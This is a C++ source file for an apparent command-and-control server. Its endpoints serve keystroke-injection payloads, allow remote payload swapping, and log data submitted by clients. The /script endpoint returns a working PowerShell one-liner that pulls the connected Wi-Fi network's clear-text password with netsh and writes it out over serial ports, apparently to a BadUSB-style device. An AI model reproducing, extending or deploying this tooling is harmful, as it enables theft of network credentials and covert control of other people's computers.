import c2server.config;
import c2server.error;
import c2server.http;
import c2server.logger;
import c2server.middleware;
import c2server.payload;
import c2server.router;
import c2server.server;
import std;

namespace {

   using SubmissionSink = std::function<void(std::string_view ip, std::string_view data)>;

   constexpr std::string_view kDefaultPayload = "WIN_R\n"
                                                "DELAY:600\n"
                                                "notepad\n"
                                                "ENTER\n"
                                                "DELAY:1000\n"
                                                "Hello from remote payload!\n";
   constexpr std::string_view kDefaultSubmissionPath = "submissions.log";

   void addDefaultEndpoints(c2server::Router& router, std::shared_ptr<c2server::PayloadStoreBase> payload,
                            SubmissionSink submissionSink) {
      router.get("/script", [](const c2server::HttpRequest&) {
         return c2server::ok(
             "$w=(Get-NetAdapter|?{$_.NdisPhysicalMedium -eq 9}"
             "|%{(Get-NetConnectionProfile -InterfaceIndex $_.ifIndex).Name}"
             "|select -f 1);"
             "$p=(netsh wlan show profile name=$w key=clear"
             "|sls 'Key Content').ToString().Split(':')[1].Trim();"
             "3..20|%{try{$s=[IO.Ports.SerialPort]::new(\"COM$_\",9600);$s.Open();$s.WriteLine(\"$w|$p\");$s.Close()}catch{}}");
      });

      router.get("/payload", [payload](const c2server::HttpRequest& req) {
         c2server::log::info("Payload requested by {}", req.remoteIp);
         return c2server::ok(payload->get());
      });

      router.post("/submit", [submissionSink = std::move(submissionSink)](const c2server::HttpRequest& req) {
         c2server::log::info("Submission from {}: {} bytes", req.remoteIp, req.body.size());
         c2server::log::debug("Submission data:\n{}", req.body);
         submissionSink(req.remoteIp, req.body);
         return c2server::jsonOk({{"status", "ok"}});
      });

      router.post("/set_payload", [payload = std::move(payload)](const c2server::HttpRequest& req) {
         payload->set(req.body);
         c2server::log::info("Payload updated by {}", req.remoteIp);
         return c2server::jsonOk({{"status", "payload updated"}});
      });
   }

   SubmissionSink makeFileSubmissionSink(std::string_view path) {
      auto filePath = std::string{path};
      if (filePath.empty()) {
         throw c2server::SubmissionError{"submission log path must not be empty"};
      }

      return [filePath = std::move(filePath)](std::string_view ip, std::string_view data) {
         auto out = std::ofstream{filePath, std::ios::app};
         if (!out) {
            throw c2server::SubmissionError{"failed to open submission log '{}'", filePath};
         }
         out << '[' << ip << "]\n" << data << "\n---\n";
         if (!out) {
            throw c2server::SubmissionError{"failed to write submission log '{}'", filePath};
         }
      };
   }

} // namespace

int main(int argc, char* argv[]) {
   try {
      const auto configPath = argc > 1 ? std::string_view{argv[1]} : std::string_view{"config.json"};
      auto config = c2server::loadAppConfig(configPath);

      auto logShutdownGuard = c2server::log::init(config.logFile);
      c2server::log::info("Starting c2server with config {}", configPath);

      auto payload = std::make_shared<c2server::PayloadStore>(std::string{kDefaultPayload});
      auto router = std::make_shared<c2server::Router>();
      router->use(c2server::middleware::requestId())
          .use(c2server::middleware::accessLog())
          .use(c2server::middleware::securityHeaders())
          .use(c2server::middleware::cors())
          .use(c2server::middleware::rateLimit());
      addDefaultEndpoints(*router, payload, makeFileSubmissionSink(kDefaultSubmissionPath));

      c2server::Server{std::move(config.server), router}.run();
      return 0;
   } catch (const std::exception& e) {
      std::println(std::cerr, "c2server: {}", e.what());
      return 1;
   }
}
